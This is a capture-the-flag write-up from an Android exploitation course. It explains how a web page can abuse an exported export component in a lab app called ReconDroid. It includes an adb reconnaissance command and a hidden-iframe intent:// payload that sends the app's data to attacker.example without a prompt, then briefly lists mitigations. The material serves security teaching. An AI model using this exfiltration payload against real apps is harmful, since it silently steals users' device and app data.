# ReconDroid — The Application Intelligence Provider

> **Course:** [Android Application Exploitation Challenges](https://academy.8ksec.io/course/android-application-exploitation-challenges)
> **Focus:** Browser-based attack · exported component abuse
> Android 15 · no additional permissions

## Goal

A device/app **reconnaissance tool** with backup & export features. Host a
malicious web page that — simply by being **opened in the victim's
browser** — abuses the Export functionality to send the app's sensitive
data to an attacker server.

## Solution

### 1 — Map the exported surface (JADX + dumpsys)

```bash
adb shell dumpsys package com.eightksec.recondroid | grep -A6 "exported"
```

Look for an exported activity/receiver that drives the export, and how the
destination is passed (extras: `server_url`, `export_path`…).

### 2 — Drive it from a browser (no app needed)

Chrome delivers `intent://` URLs to the OS:

```html
<!-- exploit.html served from the attacker host -->
<iframe src="intent://export/#Intent;scheme=recondroid;
  S.server_url=https%3A%2F%2Fattacker.example%2Fcollect;
  S.format=json;end" style="display:none"></iframe>
```

(adjust the scheme/extras to the component found in step 1; string extras
must be URL-encoded)

3. Host the page and send the link to the victim — the browser hands the
   intent to the app, which exports its recon dataset **to the attacker
   URL** without any prompt or permission.

4. Collect the POST on the attacker server — the payload contains the
   device/app inventory — lab solved.

## Mitigation

Never expose export/back-up components `exported="true"`; validate the
caller; require user interaction (Chooser) for any outbound data
destination supplied through intents.
